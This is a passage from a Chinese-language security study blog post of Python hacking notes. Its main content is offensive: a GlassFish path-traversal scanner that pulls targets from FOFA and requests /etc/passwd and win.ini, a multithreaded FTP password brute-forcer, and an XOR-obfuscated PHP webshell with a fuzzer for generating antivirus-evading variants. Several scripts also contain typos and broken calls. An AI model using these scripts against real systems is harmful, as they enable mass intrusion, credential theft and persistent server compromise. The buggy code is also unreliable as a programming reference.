class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python">request 相关<br>requests 模块 Request 支持 HTTP 连接保持和连接池，支持使用 cookie 保持会话，支持文件上传，支持自动响应内容的编码，支持国际化的 URL 和 POST 数据自动编码；使用 Requests 可以完成浏览器可有的任何操作<br>r.status_code <span class="hljs-comment">#获取响应状态码</span><br>r.url <span class="hljs-comment">#获取url</span><br>r.content <span class="hljs-comment">#获取内容以二进制文本显示</span><br>r.text <span class="hljs-comment">#获取到的内容以text文本形式显示</span><br>r,requests.headers <span class="hljs-comment">#请求头的信息</span><br>r.headers <span class="hljs-comment">#响应头的信息</span><br>r.cookies <span class="hljs-comment">#获取cookie</span><br><br>文件读取<br>w:写入模式；如果文件已经存在，清空文件内容；如果不存在，创建文件<br>x:写入模式；如果文件已经存在，抛出异常；如果不存在，创建文件并写入内容<br>a:追加模式；不覆盖文件的原始内容<br><br>f.write(<span class="hljs-string">&#x27;hello&#x27;</span>) 写入 hello<br>f.close() 关闭文件<br>f.strip() 去掉换行（否则在读取文件内容并显示的时候， 每一行都会有多余的换行）<br>f.read(<span class="hljs-number">10</span>) 读取 <span class="hljs-number">10</span> 个字节<br>f.readline() 读取一行（也可以跟数字）<br><br><br>python + glassfish 代码实现<br><br><span class="hljs-keyword">import</span> requests,urllib,base64,time<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">如何实现漏洞批量化</span><br><span class="hljs-string">1.获取可能存在漏洞的地址</span><br><span class="hljs-string">2.批量请求进行判断</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_poc</span>():<br>    payload_linux = <span class="hljs-string">&#x27;/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&#x27;</span><br>    payload_win = <span class="hljs-string">&#x27;/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&#x27;</span><br><br>    <span class="hljs-comment">#data_linux = requests.get(url + payload_linux)</span><br>    <span class="hljs-comment">#data_win = requests.get(url + payload_win)</span><br>    <span class="hljs-comment">#print(data_linux.content.decode(&#x27;utf-8&#x27;))</span><br>    <span class="hljs-comment">#print(data_win.content.decode(&#x27;utf-8&#x27;))</span><br>    <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span> (<span class="hljs-string">&#x27;ip.txt&#x27;</span>):<br>        ip = ip.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            vuln_linux_state = requests.get(ip + payload_linux).status_code<br>            vuln_win_state = requests.get(ip + payload_win).status_code<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;check-&gt;&#x27;</span> + ip)<br>            <span class="hljs-keyword">if</span> vuln_linux_state==<span class="hljs-number">200</span> <span class="hljs-keyword">or</span> vuln_win_state==<span class="hljs-number">200</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;vuln.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    f.write(ip + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                    f.close<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;no&#x27;</span>)<br>            time.sleep(<span class="hljs-number">0.5</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fofa_search</span>():<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    #shodan</span><br><span class="hljs-string">    search_data = &#x27;&quot;glassfish&quot; &amp;&amp; port = &quot;4848&quot;&#x27;</span><br><span class="hljs-string">    url = &#x27;https://www.shodan.io/search?query=&#x27;</span><br><span class="hljs-string">    urls = url + urllib.parse.quote(search_data)</span><br><span class="hljs-string">    result = requests.get(urls).content</span><br><span class="hljs-string">    print(result.decode(&#x27;utf-8&#x27;))</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br>    <span class="hljs-comment">#fofa必须要有cookie</span><br>    headers=&#123;  <span class="hljs-comment">#F12的cookie中删除第一个值,和最后一个值</span><br>        <span class="hljs-string">&quot;cookie&quot;</span>:<br>    &#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>):<br>        <span class="hljs-comment">#1页</span><br>        search_data = <span class="hljs-string">&#x27;&quot;glassfish&quot; &amp;&amp; port=&quot;4848&quot; &amp;&amp; country=&quot;CN&quot;&#x27;</span><br>        search_bs = <span class="hljs-built_in">str</span>(base64.b64encode(search_data.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        url = <span class="hljs-string">&#x27;https://fofa.info/result?qbase64=&#x27;</span><br>        urls = url + search_bs + <span class="hljs-string">&#x27;&amp;page=&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;&amp;page_size=20&#x27;</span><br>        <span class="hljs-keyword">try</span>:<br>            result = requests.get(urls, headers=headers).content<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在提取第&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;页&#x27;</span>)<br>            soup = etree.HTML(result)<br>            result_ip = soup.xpath(<span class="hljs-string">&#x27;//span[@class=&quot;aSpan&quot;]/a/@href&#x27;</span>)<br>            ipdata = <span class="hljs-string">&#x27;\n&#x27;</span>.join(result_ip)<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;ip.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(ipdata + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                f.close()<br>            time.sleep(<span class="hljs-number">0.5</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  	<span class="hljs-comment">#search = sys.argv[1]</span><br>    <span class="hljs-comment">#page = sys.argv[2]</span><br>    <span class="hljs-comment">#fofa_search(search,int(page))</span><br>    fofa_search()<br>    check_poc()<br><br><br><br>python + 教育平台SRC<br><br><span class="hljs-keyword">import</span> requests,time<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edu_list</span>(<span class="hljs-params">page</span>):<br>    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,page+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">try</span>:<br>            url = <span class="hljs-string">&#x27;https://src.sjtu.edu.cn/list/?page=&#x27;</span>+<span class="hljs-built_in">str</span>(page)<br>            data = requests.get(url).content<br>            <span class="hljs-comment"># print(data)</span><br>            soup = etree.HTML(data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>            result = soup.xpath(<span class="hljs-string">&#x27;//td[@class=&quot;&quot;]/a/text()&#x27;</span>)<br>            <span class="hljs-comment"># print(result)</span><br>            results = <span class="hljs-string">&#x27;\n&#x27;</span>.join(result)<br>            resultss = results.split()<br>            <span class="hljs-built_in">print</span>(resultss)<br>            <span class="hljs-keyword">for</span> edu <span class="hljs-keyword">in</span>  resultss:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span> (<span class="hljs-string">r&#x27;edusrc.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    f.write(edu + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                    f.close()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            time.sleep(<span class="hljs-number">0.5</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    page = sys.argv[<span class="hljs-number">1</span>]<br>    edu_list(<span class="hljs-built_in">int</span>(page))<br><br></code></pre></td></tr></table></figure>



<h3 id="其他协议爆破"><a href="#其他协议爆破" class="headerlink" title="其他协议爆破"></a>其他协议爆破</h3><p>**Ftplib 模块 — ftp 爆破 **</p>
<p>需要 连接的 IP；端口；用户名；密码字典 （ fuzz 字典）</p>
<p><strong>思路</strong></p>
<ol>
<li>连接 ftp 服务需要输入的内容（参数）有： ①连接的 IP ②端口（默认 22） ③用户名 ④密码（字典）</li>
<li>使用 python 的 ftplib 模块可实现 ftp 登录，登入输入参数，IP；端口；用户名；密码 进行连接。</li>
</ol>
<p>Ftp的参数：host — 调用connect(host)方法 、 user — 调用login(user，password，acct)方法</p>
<p>​					timeout — 超时函数，若不指定则应用全局超时函数</p>
<p>​					source_address — 二元组(host，port)，连接前绑定的socket源地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python">ftp 常用函数:<br><br><span class="hljs-keyword">from</span> ftplib <span class="hljs-keyword">import</span> FTP       														 <span class="hljs-comment">#加载ftp模块</span><br><br>ftp=FTP() 							    													   <span class="hljs-comment">#设置变量</span><br><br>ftp.set_debuglevel(<span class="hljs-number">2</span>)         													 <span class="hljs-comment">#打开调试级别2，显示详细信息</span><br><br>ftp.connect(<span class="hljs-string">&quot;IP&quot;</span>,<span class="hljs-string">&quot;port&quot;</span>)    													   <span class="hljs-comment">#连接的ftp sever和端口</span><br><br>ftp.login(<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>)  													 <span class="hljs-comment">#连接的用户名，密码</span><br><br><span class="hljs-built_in">print</span> ftp.getwelcome()      													   <span class="hljs-comment">#打印出欢迎信息</span><br><br>ftp.cmd(<span class="hljs-string">&quot;xxx/xxx&quot;</span>)           														 <span class="hljs-comment">#更改远程目录</span><br><br>bufsize=<span class="hljs-number">1024</span>                 														 <span class="hljs-comment">#设置的缓冲区大小</span><br><br>filename=<span class="hljs-string">&quot;filename.txt&quot;</span>       													 <span class="hljs-comment">#需要下载的文件</span><br><br>file_handle=<span class="hljs-built_in">open</span>(filename,<span class="hljs-string">&quot;wb&quot;</span>).write                    <span class="hljs-comment">#以写模式在本地打开文件</span><br><br>ftp.retrbinaly(<span class="hljs-string">&quot;RETR filename.txt&quot;</span>,file_handle,bufsize)  <span class="hljs-comment">#接收服务器上文件并写入本地文件</span><br><br>ftp.set_debuglevel(<span class="hljs-number">0</span>)                                    <span class="hljs-comment">#关闭调试模式</span><br><br>ftp.quit                                                 <span class="hljs-comment">#退出ftp</span><br><br>ftp相关命令操作:<br><br>ftp.cwd(pathname) 																			 <span class="hljs-comment">#设置FTP当前操作的路径</span><br><br>ftp.<span class="hljs-built_in">dir</span>() 																							 <span class="hljs-comment">#显示目录下文件信息</span><br><br>ftp.nlst() 																							 <span class="hljs-comment">#获取目录下的文件</span><br><br>ftp.mkd(pathname)																				 <span class="hljs-comment">#新建远程目录</span><br><br>ftp.pwd()																								 <span class="hljs-comment">#返回当前所在位置</span><br><br>ftp.rmd(dirname)																				 <span class="hljs-comment">#删除远程目录</span><br><br>ftp.delete(filename)																		 <span class="hljs-comment">#删除远程文件</span><br><br>ftp.rename(fromname, toname)														 <span class="hljs-comment">#将fromname修改名称为toname。</span><br><br>ftp.storbinaly(<span class="hljs-string">&quot;STOR filename.txt&quot;</span>,file_handel,bufsize)  <span class="hljs-comment">#上传目标文件 //（断点续传，不错）</span><br><br>ftp.retrbinary(<span class="hljs-string">&quot;RETR filename.txt&quot;</span>,file_handel,bufsize)  <span class="hljs-comment">#下载FTP文件 //（断点续传，不错）</span><br><br>代码实现:<br><span class="hljs-keyword">import</span> ftplib, threading, queue, sys<br><br><span class="hljs-comment">#利用python开发其他协议爆破脚本</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ftp_check</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> q.empty():<br>        <span class="hljs-built_in">dict</span> = q.get()<br>        <span class="hljs-built_in">dict</span> = <span class="hljs-built_in">dict</span>.split(<span class="hljs-string">&#x27;|&#x27;</span>)<br>        username = <span class="hljs-built_in">dict</span>[<span class="hljs-number">0</span>]<br>        password = dicr[<span class="hljs-number">1</span>]<br>        ftp = ftplib.FTP()<br>        <span class="hljs-keyword">try</span>:<br>            ftp.connect(<span class="hljs-string">&#x27;IP地址&#x27;</span>,<span class="hljs-number">21</span>)<br>            ftp.login(username,password)<br>            ftp.retrlines(<span class="hljs-string">&#x27;list&#x27;</span>)<br>            ftp.close()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;success|&#x27;</span> + username + <span class="hljs-string">&#x27;|&#x27;</span> + password)<br>        <span class="hljs-keyword">except</span> ftplib.all_errors:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;failed|&#x27;</span> + username + <span class="hljs-string">&#x27;|&#x27;</span> + password)<br>            ftp.close()<br>            <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ ==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;python ftp_burp.py user.txt pass.txt 10&#x27;</span>)<br>    user_file = sys.argv[<span class="hljs-number">1</span>]<br>    pass_file = sys.argv[<span class="hljs-number">2</span>]<br>    thread_x = sys.argv[<span class="hljs-number">3</span>]<br>    q = queue.Queue()<br>    <span class="hljs-keyword">for</span> username <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(user_file):<br>        <span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(pass_file):<br>            username = username.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>            password =password.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>            diclist = username + <span class="hljs-string">&#x27;|&#x27;</span> + password<br>            q.put(diclist)<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(thread_x)):<br>        <span class="hljs-comment">#多线程</span><br>        t = threading.Thread(target=ftp_check)<br>        t.start<br><br></code></pre></td></tr></table></figure>



<h3 id="python-免杀"><a href="#python-免杀" class="headerlink" title="python 免杀"></a>python 免杀</h3><p><strong>异或免杀</strong></p>
<p>异或一句话木马 <?php $a=(“!”^”@”).’ssert’;$a($_POST[x];?> 其原形为<?php assert($_POST[x]);?></p>
<p><strong>原理</strong></p>
<p><code>!的 ASCII 为 33；@的 ASCII 为 64</code></p>
<p>二者的值转换成二进制，并且进行异或运算，得出的二进制结果再转换成 ASCII，该值为 97，查询为 a 通过 fuzz 来生成免杀木马</p>
<p><strong>思路</strong></p>
<p>不看二进制的异或计算，列出所有 ASCII 值&lt;127 的的组合（127x127），将这些组合放入一句话木马中，然后测试该 payload 是否成功，写入到网站根目录；发起 requests 请求， 看返回内容，能够执行的文件返回的内容和不能执行的文件返回的内容是不一样的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python">代码实现：<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> threading, queue<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">string</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> q.empty():<br>        filename = q.get()<br>        url = <span class="hljs-string">&#x27;http://127.0.0.1:8081/x/&#x27;</span> + filename<br>        datas = &#123;<br>            <span class="hljs-string">&#x27;x&#x27;</span>:<span class="hljs-string">&#x27;phpinfo();&#x27;</span><br>        &#125;<br>        result = requests.post(url,data=datas).contnet.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;XXX-PC&#x27;</span> <span class="hljs-keyword">in</span> result:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;check-&gt;&#x27;</span> + filname + <span class="hljs-string">&#x27;-&gt;ok&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;check-&gt;&#x27;</span> + filname + <span class="hljs-string">&#x27;-&gt;no&#x27;</span>)<br>        time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shell_test_check</span>():<br>    url = <span class="hljs-string">&#x27;http://127.0.0.1:8081/x/33bh64.php&#x27;</span><br>    datas = &#123;<br>        <span class="hljs-string">&#x27;x&#x27;</span>:<span class="hljs-string">&#x27;phpinfo();&#x27;</span><br>    &#125;<br>    result = requests.post(url,data=datas).contnet.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(result)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;XXX-PC&#x27;</span> <span class="hljs-keyword">in</span> result:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ok&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    q = queue.Queue()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>            payload = <span class="hljs-string">&quot;&quot;</span> + <span class="hljs-built_in">chr</span>(i) + <span class="hljs-string">&quot;&quot;</span> + <span class="hljs-string">&#x27;^&#x27;</span> + <span class="hljs-string">&quot;&quot;</span> + <span class="hljs-built_in">chr</span>(ii) + <span class="hljs-string">&quot;&quot;</span><br>            code = <span class="hljs-string">&quot;&lt;?php $a = (&quot;</span> + payload + <span class="hljs-string">&quot;).&#x27;ssert&#x27;;$a($_POST[x]);?&gt;&quot;</span><br>            filename = <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;bh&#x27;</span> + <span class="hljs-built_in">str</span>(ii) + <span class="hljs-string">&#x27;.php&#x27;</span><br>            q.put(filename)<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span> (<span class="hljs-string">&#x27;保存路径&#x27;</span> + filename,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(code)<br>                f.close<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Fuzz文件生成&#x27;</span>)<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>        <span class="hljs-comment">#多线程</span><br>        t = threading.Thread(target=string)<br>        t.start<br></code></pre></td></tr></table></figure>

<p><strong>更多思路</strong></p>
<?php assert($_POST[x]);?><p>这种一句话的内容都可以通过异或去生成，或者以其它免杀方式结合异或，代码变异</p>
<h3 id="SqlmapApi"><a href="#SqlmapApi" class="headerlink" title="SqlmapApi"></a>SqlmapApi</h3><h1 id="十一、漏洞复现"><a href="#十一、漏洞复现" class="headerlink" title="十一、漏洞复现"></a>十一、漏洞复现</h1>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Study Note</div>
      <div>http://example.com/2022/04/23/Study Note/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Big Head</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2022年4月23日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/06/26/Test/" title="Test">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Test</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.iohttps://github.com/BH0sec/bh0sec.github.io" target="_blank" rel="nofollow noopener"><span>Github</span></a> <i class="iconfont icon-love"></i> <a href="https://www.baidu.com" target="_blank" rel="nofollow noopener"><span>BigHead</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


